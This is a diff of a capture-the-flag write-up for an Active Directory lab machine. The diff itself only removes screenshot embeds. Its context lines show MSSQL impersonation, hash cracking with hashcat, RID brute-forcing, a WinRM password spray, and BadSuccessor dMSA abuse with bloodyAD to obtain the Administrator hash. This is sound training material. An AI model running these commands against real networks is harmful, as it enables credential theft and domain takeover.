@@ -71,9 +71,6 @@ Host script results:
 ```
 {: file="nmap output (trimmed)" }
 
-![Nmap scan results](nmap.png)
-_Three services exposed: IIS, MSSQL 2022, and WinRM._
-
 **Takeaways:**
 - **`DC01` / `eighteen.htb`** → this is a Domain Controller, so we're working against Active Directory.
 - **`Product_Version: 10.0.26100`** → Windows Server 2025 build. Worth remembering — it enables a newer escalation path later.
@@ -117,9 +114,6 @@ grantee   can_impersonate
 kevin     appdev
 ```
 
-![MSSQL impersonation enumeration](mssql-impersonate.png)
-_`kevin` is allowed to impersonate the `appdev` login._
-
 Switching context to `appdev` and confirming:
 
 ```sql
@@ -143,9 +137,6 @@ id    full_name  username  email               password_hash                    
 1002  admin      admin     admin@eighteen.htb  pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$0673ad90a0b4afb19d662336f...   1
 ```
 
-![financial_planner users table](financial-planner-users.png)
-_The admin account's PBKDF2-HMAC-SHA256 hash, stored in Werkzeug's `pbkdf2:sha256:iterations$salt$hash` format._
-
 ### Cracking the PBKDF2 Hash
 
 hashcat's PBKDF2-HMAC-SHA256 mode (`10900`) expects the fields in a specific order with **base64-encoded** salt and digest, not the raw Werkzeug string. A one-liner does the conversion:
@@ -161,17 +152,12 @@ print(f'sha256:600000:{salt_b64}:{hash_b64}')"
 sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=
 ```
 
-![Building the hashcat-formatted hash](hashcat-format.png)
-
 ```console
 $ hashcat -m 10900 hash.txt /usr/share/wordlists/rockyou.txt
 ...
 sha256:600000:QU10enRlUUlHN3lBYlpJYQ==:BnOtkKC0r7GdZiM28Pzjqe3Qt7GRk3F74ozk1myIcTM=:iloveyou1
 Status...........: Cracked
 ```
-
-![hashcat cracked the password](hashcat-cracked.png)
-_The admin password is `iloveyou1`._
 
 > **Dead ends:** the recovered password unlocked the admin account on the web app and on WinRM as `admin`, but neither led anywhere. The value of the credential turned out to be as spray material, not as a direct login.
 {: .prompt-warning }
@@ -183,8 +169,6 @@ A single reused password is only useful if we know *who* to try it against. MSSQ
 ```console
 $ netexec mssql eighteen.htb -u kevin -p 'iNa2we6haRj2gaw!' --local-auth --rid-brute | tee rid_brute.txt
 ```
-
-![RID brute-forcing domain users via MSSQL](rid-brute.png)
 
 I extracted the human accounts into `users.txt`:
 
@@ -206,9 +190,6 @@ $ netexec winrm eighteen.htb -u users.txt -p iloveyou1 --continue-on-success
 ...
 WINRM  eighteen.htb\adam.scott:iloveyou1  (Pwn3d!)
 ```
-
-![Password spray hits adam.scott](password-spray.png)
-_`adam.scott` reused `iloveyou1`, and the `Pwn3d!` tag confirms WinRM access._
 
 ### Shell as `adam.scott`
 
@@ -236,8 +217,6 @@ DomainMode : Windows2025Domain
 DomainSID  : S-1-5-21-1152179935-589108180-1989892463
 ```
 
-![Get-ADDomain shows Windows2025Domain](get-addomain.png)
-
 A **Windows Server 2025** domain introduces **delegated Managed Service Accounts (dMSA)** — and with them, the **BadSuccessor** technique disclosed by Akamai. In short: any principal holding create-child (or write) rights over *an OU* can create a dMSA, link it to a target account (e.g. `Administrator`), and have the KDC issue that dMSA keys that inherit the target's — effectively impersonating a Domain Admin.
 
 Checking whether our user has such rights with Akamai's helper script:
@@ -253,9 +232,6 @@ EIGHTEEN\IT  {OU=Staff,DC=eighteen,DC=htb}
 EIGHTEEN\IT   Group   S-1-5-21-1152179935-589108180-1989892463-1604 ...
 ```
 
-![BadSuccessor OU permissions and group membership](badsuccessor-ou.png)
-_`adam.scott` belongs to `EIGHTEEN\IT`, which can create objects under `OU=Staff` — exactly the primitive BadSuccessor needs._
-
 ### Abusing the dMSA
 
 `bloodyAD` automates the attack: create a dMSA under the writable OU, mark it as the "successor" of `Administrator`, and retrieve the resulting keys. Because `bloodyAD` runs from my host, I first pushed a `ligolo-ng` agent to the target to route traffic into the internal interface (`240.0.0.1`):
@@ -270,9 +246,6 @@ $ bloodyAD -d eighteen.htb -u adam.scott -p 'iloveyou1' -H 240.0.0.1 \
 dMSA previous keys found in TGS (including keys of preceding managed accounts):
 RC4:  0b133be956bfaddf9cea56701affddec
 ```
-
-![bloodyAD BadSuccessor yields the Administrator RC4 hash](bloodyad.png)
-_The dMSA inherits `Administrator`'s keys, giving us its RC4 (NT) hash._
 
 ### Pass-the-Hash → Domain Admin
 
